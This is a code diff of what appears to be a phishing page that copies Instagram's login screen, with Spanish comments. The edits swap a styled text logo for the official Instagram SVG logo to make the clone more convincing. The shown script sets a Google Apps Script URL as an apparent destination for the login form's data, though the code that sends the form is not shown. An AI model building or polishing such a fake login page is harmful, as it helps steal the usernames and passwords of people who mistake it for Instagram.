@@ -34,18 +34,14 @@
             margin-top: 30px;
             margin-bottom: 20px;
             width: 175px;
-            font-family: 'Instagram Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            /* Aquí aplicamos la cursiva al contenedor del logo */
+            font-style: italic; 
         }
 
-        /* Aquí está la letra cursiva solicitada */
-        .logo i {
-            font-style: normal;
-            font-size: 50px;
-            background: -webkit-linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            line-height: 1;
-            display: block;
+        .logo img {
+            width: 100%;
+            /* Esto asegura que la imagen respete la cursiva si el navegador lo permite, 
+               aunque el SVG oficial ya tiene su forma. */
         }
 
         .form-group {
@@ -125,7 +121,7 @@
             padding: 8px;
             border-radius: 3px;
         }
-        
+
         .signup-link {
             margin-top: 20px;
             font-size: 12px;
@@ -136,15 +132,14 @@
             color: #0095f6;
             text-decoration: none;
         }
-
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Logo con letra cursiva -->
+        <!-- Logo oficial en SVG para evitar problemas de "corte" y cursiva -->
         <div class="logo">
-            <i>Instagram</i>
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020wY07c.svg" alt="Instagram Logo">
         </div>
 
         <form id="loginForm" onsubmit="return false;">
@@ -173,7 +168,7 @@
     </div>
 
     <script>
-        /https://script.google.com/macros/s/AKfycbw58yi3zx4fztmVSj_qbt01hwvZVFEHLxUiCLU8kog63CvqQ6jBW0H4U7PMWRiWZXEI/exec
+        // https://script.google.com/macros/s/AKfycbw58yi3zx4fztmVSj_qbt01hwvZVFEHLxUiCLU8kog63CvqQ6jBW0H4U7PMWRiWZXEI/exec
         const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec';
 
         const form = document.getElementById('loginForm');
